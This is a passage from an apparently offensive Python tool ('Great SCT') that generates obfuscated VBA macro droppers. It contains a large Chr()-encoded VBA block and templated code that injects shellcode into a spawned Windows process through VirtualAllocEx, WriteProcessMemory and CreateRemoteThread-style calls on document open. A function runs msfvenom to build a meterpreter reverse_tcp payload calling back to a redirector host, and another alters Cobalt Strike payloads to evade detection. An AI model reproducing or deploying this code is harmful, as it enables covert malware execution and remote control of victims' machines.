Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(100)&Chr(119)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(70)&Chr(108)&Chr(97)&Chr(103)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)& _
Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(73)&Chr(68)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(41)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)& _
Chr(32)&Chr(32)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(68)&Chr(101)&Chr(99)&Chr(108)&Chr(97)&Chr(114)&Chr(101)&Chr(32)&Chr(70)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)& _
Chr(83)&Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(32)&Chr(76)&Chr(105)&Chr(98)&Chr(32)&Chr(34)&Chr(107)&Chr(101)&Chr(114)&Chr(110)&Chr(101)&Chr(108)&Chr(51)&Chr(50)&Chr(34)&Chr(32)&Chr(65)&Chr(108)&Chr(105)&Chr(97)&Chr(115)&Chr(32)&Chr(34)&Chr(86)&Chr(105)&Chr(114)&Chr(116)& _
Chr(117)&Chr(97)&Chr(108)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(69)&Chr(120)&Chr(34)&Chr(32)&Chr(40)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(104)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)& _
Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(112)&Chr(65)&Chr(100)&Chr(100)&Chr(114)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)& _
Chr(32)&Chr(108)&Chr(83)&Chr(105)&Chr(122)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(102)&Chr(108)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(97)&Chr(116)&Chr(105)& _
Chr(111)&Chr(110)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(102)&Chr(108)&Chr(80)&Chr(114)&Chr(111)&Chr(116)&Chr(101)&Chr(99)&Chr(116)&Chr(32)& _
Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(41)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(68)&Chr(101)&Chr(99)& _
Chr(108)&Chr(97)&Chr(114)&Chr(101)&Chr(32)&Chr(70)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(87)&Chr(114)&Chr(105)&Chr(116)&Chr(101)&Chr(83)&Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(32)&Chr(76)&Chr(105)&Chr(98)&Chr(32)&Chr(34)&Chr(107)&Chr(101)& _
Chr(114)&Chr(110)&Chr(101)&Chr(108)&Chr(51)&Chr(50)&Chr(34)&Chr(32)&Chr(65)&Chr(108)&Chr(105)&Chr(97)&Chr(115)&Chr(32)&Chr(34)&Chr(87)&Chr(114)&Chr(105)&Chr(116)&Chr(101)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(77)&Chr(101)&Chr(109)&Chr(111)&Chr(114)& _
Chr(121)&Chr(34)&Chr(32)&Chr(40)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(104)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)& _
Chr(108)&Chr(32)&Chr(108)&Chr(68)&Chr(101)&Chr(115)&Chr(116)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(82)&Chr(101)&Chr(102)&Chr(32)&Chr(83)&Chr(111)&Chr(117)&Chr(114)&Chr(99)&Chr(101)&Chr(32)&Chr(65)&Chr(115)& _
Chr(32)&Chr(65)&Chr(110)&Chr(121)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(76)&Chr(101)&Chr(110)&Chr(103)&Chr(116)&Chr(104)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)& _
Chr(108)&Chr(32)&Chr(76)&Chr(101)&Chr(110)&Chr(103)&Chr(116)&Chr(104)&Chr(87)&Chr(114)&Chr(111)&Chr(116)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(41)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)& _
Chr(32)&Chr(32)&Chr(32)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(68)&Chr(101)&Chr(99)&Chr(108)&Chr(97)&Chr(114)&Chr(101)&Chr(32)&Chr(70)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(82)&Chr(117)&Chr(110)&Chr(83)& _
Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(32)&Chr(76)&Chr(105)&Chr(98)&Chr(32)&Chr(34)&Chr(107)&Chr(101)&Chr(114)&Chr(110)&Chr(101)&Chr(108)&Chr(51)&Chr(50)&Chr(34)&Chr(32)&Chr(65)&Chr(108)&Chr(105)&Chr(97)&Chr(115)&Chr(32)&Chr(34)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)& _
Chr(101)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(65)&Chr(34)&Chr(32)&Chr(40)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(112)&Chr(65)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(78)& _
Chr(97)&Chr(109)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)&Chr(112)&Chr(67)&Chr(111)&Chr(109)&Chr(109)&Chr(97)&Chr(110)&Chr(100)&Chr(76)&Chr(105)& _
Chr(110)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(65)&Chr(116)&Chr(116)&Chr(114)&Chr(105)&Chr(98)&Chr(117)&Chr(116)&Chr(101)& _
Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(65)&Chr(110)&Chr(121)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(65)&Chr(116)&Chr(116)&Chr(114)&Chr(105)&Chr(98)&Chr(117)&Chr(116)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)& _
Chr(65)&Chr(110)&Chr(121)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(98)&Chr(73)&Chr(110)&Chr(104)&Chr(101)&Chr(114)&Chr(105)&Chr(116)&Chr(72)&Chr(97)&Chr(110)&Chr(100)&Chr(108)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)& _
Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(100)&Chr(119)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(70)&Chr(108)&Chr(97)&Chr(103)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)& _
Chr(103)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(69)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(65)&Chr(110)&Chr(121)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(108)& _
Chr(112)&Chr(67)&Chr(117)&Chr(114)&Chr(114)&Chr(101)&Chr(110)&Chr(116)&Chr(68)&Chr(114)&Chr(105)&Chr(101)&Chr(99)&Chr(116)&Chr(111)&Chr(114)&Chr(121)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(83)& _
Chr(116)&Chr(97)&Chr(114)&Chr(116)&Chr(117)&Chr(112)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(84)&Chr(65)&Chr(82)&Chr(84)&Chr(85)&Chr(80)&Chr(73)&Chr(78)&Chr(70)&Chr(79)&Chr(44)&Chr(32)&Chr(108)&Chr(112)&Chr(80)&Chr(114)&Chr(111)& _
Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(80)&Chr(82)&Chr(79)&Chr(67)&Chr(69)&Chr(83)&Chr(83)&Chr(95)&Chr(73)&Chr(78)&Chr(70)&Chr(79)&Chr(82)& _
Chr(77)&Chr(65)&Chr(84)&Chr(73)&Chr(79)&Chr(78)&Chr(41)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(35)&Chr(69)&Chr(110)&Chr(100)&Chr(32)&Chr(73)&Chr(102)&Chr(10)&Chr(10)&Chr(83)&Chr(117)&Chr(98)&Chr(32)&Chr(65)&Chr(117)&Chr(116)& _
Chr(111)&Chr(95)&Chr(79)&Chr(112)&Chr(101)&Chr(110)&Chr(40)&Chr(41)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(109)&Chr(121)&Chr(66)&Chr(121)&Chr(116)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)& _
Chr(32)&Chr(109)&Chr(121)&Chr(65)&Chr(114)&Chr(114)&Chr(97)&Chr(121)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(86)&Chr(97)&Chr(114)&Chr(105)&Chr(97)&Chr(110)&Chr(116)&Chr(44)&Chr(32)&Chr(111)&Chr(102)&Chr(102)&Chr(115)&Chr(101)&Chr(116)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)& _
Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(112)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(80)&Chr(82)&Chr(79)&Chr(67)&Chr(69)&Chr(83)&Chr(83)&Chr(95)&Chr(73)&Chr(78)&Chr(70)& _
Chr(79)&Chr(82)&Chr(77)&Chr(65)&Chr(84)&Chr(73)&Chr(79)&Chr(78)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(115)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(84)&Chr(65)&Chr(82)&Chr(84)&Chr(85)& _
Chr(80)&Chr(73)&Chr(78)&Chr(70)&Chr(79)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(115)&Chr(78)&Chr(117)&Chr(108)&Chr(108)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(10)&Chr(32)&Chr(32)& _
Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(115)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(10)&Chr(10)&Chr(35)&Chr(73)&Chr(102)&Chr(32)&Chr(86)&Chr(66)&Chr(65)&Chr(55)&Chr(32)& _
Chr(84)&Chr(104)&Chr(101)&Chr(110)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(114)&Chr(119)&Chr(120)&Chr(112)&Chr(97)&Chr(103)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(44)& _
Chr(32)&Chr(114)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(10)&Chr(35)&Chr(69)&Chr(108)&Chr(115)&Chr(101)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(114)&Chr(119)& _
Chr(120)&Chr(112)&Chr(97)&Chr(103)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(114)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(35)&Chr(69)&Chr(110)&Chr(100)&Chr(32)& _
Chr(73)&Chr(102)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(109)&Chr(121)&Chr(65)&Chr(114)&Chr(114)&Chr(97)&Chr(121)&Chr(32)&Chr(61)&Chr(32)& _'''

	for line in shellCode:
		start += line + "\n"

	execution = '''
	If Len(Environ("ProgramW6432")) > 0 Then        
		sProc = Environ("windir") & "\\SysWOW64\\{0}"
	Else        
		sProc = Environ("windir") & "\\System32\\{1}"
	End If    

	res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)    
	rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)    

	For offset = LBound(myArray) To UBound(myArray)
		myByte = myArray(offset)        
		res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)    
	Next offset

	res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)

End Sub
Sub AutoOpen()
    Auto_Open
End Sub

Sub Workbook_Open()
    Auto_Open
End Sub'''.format(x86, x64)
	print(convertToVBAFormat(encodeStringAsChr(execution)))

	middle = ''
	
	for line in convertToVBAFormat(encodeStringAsChr(execution)):
		middle += line + "\n"


	end = '''
objExcel.DisplayAlerts = False
on error resume next
objExcel.Run "Auto_Open"
objWorkbook.Close False
objExcel.Quit

' Restore the registry to its old state	
if action = "" then
	WshShell.RegDelete RegPath
else
	WshShell.RegWrite RegPath, action, "REG_DWORD"
end if
		]]>
		</script>'''
	
	print(start + middle + end)
	return(start + middle + end)

def getMetasploitShellCode(redirector):
	'''
	Generates a metaspoit vba macro via msfvenom. 
	Parses the Array of shellcode via regex from the generated macro.
	Create a string of the meterpreter shellcode.

	Returns string of shellcode
	'''
	code = ''
	if which('msfvenom'):
		system('msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f vba > /tmp/metasploitvba'.format(redirector[0], redirector[1]))
		for line in open('/tmp/metasploitvba', 'r'):
			code += line

		shellCode = re.findall(r"(Array\(((\-|\d).*)\s+|^(\-|\d)(.*?(_|\d\))\s+))", code, flags=re.MULTILINE)
		msfShellCode = ''.join(i[0].replace('', '') for i in shellCode)

		return msfShellCode
	else:
		print('[-] ERROR: msfvenom is not installed on the system. Please install msfvenom to use Great SCT.')
		exit()

def modifyCobaltStrikePayload(cspayload, x86, x64):
	'''
	Find and replaces encoded rundll32.exe with exe specified in config.
	Specifiy a signed binary from the following locations in the config.
	x86 - C:\Windows\System32\
	x64 - C:\Windows\SysWOW64\
	'''
	x86_encoded_path = 'Chr(114)&Chr(34)&Chr(41)&Chr(32)&Chr(38)&Chr(32)&Chr(34)&Chr(92)&Chr(92)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(51)&Chr(50)&Chr(92)&Chr(92)&'
	x64_encoded_path = 'Chr(92)&Chr(83)&Chr(121)&Chr(115)&Chr(87)&Chr(79)&Chr(87)&Chr(54)&Chr(52)&Chr(92)&Chr(92)&'
	rundll32_path = 'Chr(114)&Chr(117)&Chr(110)&Chr(100)&Chr(108)&Chr(108)&Chr(51)&Chr(50)&'
	x86_replace = convertTextToChr(x86)
	x64_replace = convertTextToChr(x64)

	fileFindReplace(cspayload, x86_encoded_path + rundll32_path, x86_encoded_path + x86_replace)
	fileFindReplace(cspayload, x64_encoded_path + rundll32_path, x64_encoded_path + x64_replace)
